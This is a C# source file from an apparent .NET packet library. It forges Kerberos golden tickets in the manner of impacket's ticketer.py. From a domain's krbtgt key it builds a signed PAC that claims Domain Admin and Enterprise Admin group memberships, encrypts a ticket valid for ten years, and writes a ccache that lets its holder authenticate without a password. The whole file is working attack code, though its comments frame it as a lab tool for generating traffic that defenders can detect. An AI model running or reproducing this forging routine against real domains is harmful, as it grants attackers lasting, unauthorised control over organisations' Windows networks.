using System.Formats.Asn1;
using System.Security.Cryptography;

namespace DotNetPacket.Protocols.Krb5;

/// <summary>The result of forging a ticket: the ccache bytes to drop at KRB5CCNAME, plus a summary.</summary>
public sealed record ForgedTicket(byte[] Ccache, string Summary, int SessionKeyEtype, byte[] SessionKey);

/// <summary>
/// Forges a Kerberos golden ticket (a TGT minted from the domain's krbtgt key), mirroring impacket's
/// <c>ticketer.py</c>. Builds a signed PAC (<see cref="PacBuilder"/>), wraps it in an EncTicketPart
/// (RFC 4120 5.3) encrypted under the krbtgt key (key usage 2), assembles the Ticket ([APPLICATION 1]),
/// and writes an MIT ccache (<see cref="CCache"/>) that <c>-k</c> consumes. The forged TGT then drives a
/// normal TGS exchange, so no password is ever needed. Lab-first: this generates labelled golden-ticket
/// traffic (the long lifetime, the synthetic PAC) for a SOC to detect — it is not an evasion tool.
/// </summary>
public static class GoldenTicket
{
    private static Asn1Tag Ctx(int n) => new(TagClass.ContextSpecific, n, isConstructed: true);

    // Classic golden-ticket TicketFlags: forwardable(1) proxiable(3) renewable(8) initial(9) pre-authent(10).
    private static readonly byte[] GoldenFlags = { 0x50, 0xE0, 0x00, 0x00 };

    /// <summary>
    /// Forges a golden ticket for <paramref name="username"/>. <paramref name="krbtgtKey"/> is the domain
    /// krbtgt account key (hex-decoded) and <paramref name="etype"/> its type (AES-256/128 or RC4).
    /// </summary>
    public static ForgedTicket ForgeGolden(
        string realmFqdn, string netbiosDomain, string domainSid, string username,
        uint userRid, byte[] krbtgtKey, int etype, IReadOnlyList<uint>? groupRids = null)
    {
        string realm = realmFqdn.ToUpperInvariant();
        DateTimeOffset now = DateTimeOffset.UtcNow.AddMinutes(-5); // small backdate, like impacket
        DateTimeOffset end = now.AddYears(10);                     // the infamous 10-year golden lifetime

        var pacParams = new GoldenPacParams(
            username, userRid, domainSid, netbiosDomain,
            PrimaryGroupId: 513,
            GroupRids: groupRids ?? new uint[] { 513, 512, 520, 518, 519 },
            UserAccountControl: 0x00000210, // NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD
            LogonTime: now);
        byte[] pac = PacBuilder.Build(pacParams, etype, krbtgtKey);

        // Session key the client will share with the KDC (random, matching the krbtgt etype's length).
        byte[] sessionKey = RandomNumberGenerator.GetBytes(KeyLength(etype));

        byte[] encTicketPart = EncodeEncTicketPart(realm, username, sessionKey, etype, pac, now, end);
        byte[] encrypted = Krb5Cipher.Encrypt(etype, krbtgtKey, 2, encTicketPart); // key usage 2: ticket enc-part
        byte[] ticket = EncodeTicket(realm, encrypted, etype);

        var cred = new CcacheCredential(
            username, realm, $"krbtgt/{realm}", realm,
            etype, sessionKey,
            now, now, end, end, GoldenFlags, ticket);
        byte[] ccache = CCache.Build(username, realm, new[] { cred });

        string summary =
            $"Golden ticket for {username}@{realm} (RID {userRid})\n" +
            $"  Domain SID:  {domainSid}\n" +
            $"  krbtgt etype:{etype}  session key etype:{etype}\n" +
            $"  Groups:      {string.Join(", ", pacParams.GroupRids)}\n" +
            $"  Lifetime:    {now:u} -> {end:u}  (10y; a golden-ticket IOC)\n" +
            $"  PAC:         {pac.Length} bytes, SERVER+KDC checksums signed with the krbtgt key";

        return new ForgedTicket(ccache, summary, etype, sessionKey);
    }

    private static int KeyLength(int etype) => etype switch
    {
        Krb5Constants.Aes256CtsHmacSha1 => 32,
        Krb5Constants.Aes128CtsHmacSha1 => 16,
        Krb5Constants.Rc4Hmac => 16,
        _ => throw new NotSupportedException($"Unsupported etype {etype}."),
    };

    // EncTicketPart ::= [APPLICATION 3] SEQUENCE { flags[0], key[1], crealm[2], cname[3], transited[4],
    //   authtime[5], starttime[6], endtime[7], renew-till[8], authorization-data[10] }
    private static byte[] EncodeEncTicketPart(
        string realm, string username, byte[] sessionKey, int etype, byte[] pac,
        DateTimeOffset now, DateTimeOffset end)
    {
        var w = new AsnWriter(AsnEncodingRules.DER);
        using (w.PushSequence(new Asn1Tag(TagClass.Application, 3)))
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteBitString(GoldenFlags);                 // flags
            using (w.PushSequence(Ctx(1))) WriteEncryptionKey(w, etype, sessionKey);      // key
            using (w.PushSequence(Ctx(2))) w.WriteEncodedValue(Der.GeneralString(realm)); // crealm
            using (w.PushSequence(Ctx(3))) WritePrincipalName(w, Krb5Constants.NtPrincipal, new[] { username }); // cname
            using (w.PushSequence(Ctx(4))) WriteTransited(w);                             // transited
            using (w.PushSequence(Ctx(5))) w.WriteGeneralizedTime(now, omitFractionalSeconds: true);  // authtime
            using (w.PushSequence(Ctx(6))) w.WriteGeneralizedTime(now, omitFractionalSeconds: true);  // starttime
            using (w.PushSequence(Ctx(7))) w.WriteGeneralizedTime(end, omitFractionalSeconds: true);  // endtime
            using (w.PushSequence(Ctx(8))) w.WriteGeneralizedTime(end, omitFractionalSeconds: true);  // renew-till
            using (w.PushSequence(Ctx(10))) WriteAuthorizationData(w, pac);               // authorization-data
        }

        return w.Encode();
    }

    // Ticket ::= [APPLICATION 1] SEQUENCE { tkt-vno[0] INTEGER(5), realm[1], sname[2], enc-part[3] EncryptedData }
    private static byte[] EncodeTicket(string realm, byte[] encryptedPart, int etype)
    {
        var w = new AsnWriter(AsnEncodingRules.DER);
        using (w.PushSequence(new Asn1Tag(TagClass.Application, 1)))
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteInteger(5);                               // tkt-vno
            using (w.PushSequence(Ctx(1))) w.WriteEncodedValue(Der.GeneralString(realm));   // realm
            using (w.PushSequence(Ctx(2))) WritePrincipalName(w, Krb5Constants.NtSrvInst, new[] { "krbtgt", realm }); // sname
            using (w.PushSequence(Ctx(3)))                                                  // enc-part
            using (w.PushSequence())
            {
                using (w.PushSequence(Ctx(0))) w.WriteInteger(etype);
                using (w.PushSequence(Ctx(2))) w.WriteOctetString(encryptedPart);
            }
        }

        return w.Encode();
    }

    private static void WriteEncryptionKey(AsnWriter w, int etype, byte[] key)
    {
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteInteger(etype);
            using (w.PushSequence(Ctx(1))) w.WriteOctetString(key);
        }
    }

    // TransitedEncoding ::= SEQUENCE { tr-type [0] Int32, contents [1] OCTET STRING } (empty = no transit).
    private static void WriteTransited(AsnWriter w)
    {
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteInteger(0);
            using (w.PushSequence(Ctx(1))) w.WriteOctetString(Array.Empty<byte>());
        }
    }

    // authorization-data: AD-IF-RELEVANT (ad-type 1) wrapping AD-WIN2K-PAC (ad-type 128) carrying the PAC.
    private static void WriteAuthorizationData(AsnWriter w, byte[] pac)
    {
        byte[] inner = EncodeAdList(w2 => WriteAdElement(w2, 128, pac));
        using (w.PushSequence())
        {
            WriteAdElement(w, 1, inner);
        }
    }

    private static byte[] EncodeAdList(Action<AsnWriter> writeElements)
    {
        var w = new AsnWriter(AsnEncodingRules.DER);
        using (w.PushSequence())
        {
            writeElements(w);
        }

        return w.Encode();
    }

    // AuthorizationData element ::= SEQUENCE { ad-type [0] Int32, ad-data [1] OCTET STRING }
    private static void WriteAdElement(AsnWriter w, int adType, byte[] adData)
    {
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteInteger(adType);
            using (w.PushSequence(Ctx(1))) w.WriteOctetString(adData);
        }
    }

    // PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQUENCE OF GeneralString }
    private static void WritePrincipalName(AsnWriter w, int nameType, string[] components)
    {
        using (w.PushSequence())
        {
            using (w.PushSequence(Ctx(0))) w.WriteInteger(nameType);
            using (w.PushSequence(Ctx(1)))
            using (w.PushSequence())
            {
                foreach (string c in components)
                {
                    w.WriteEncodedValue(Der.GeneralString(c));
                }
            }
        }
    }
}
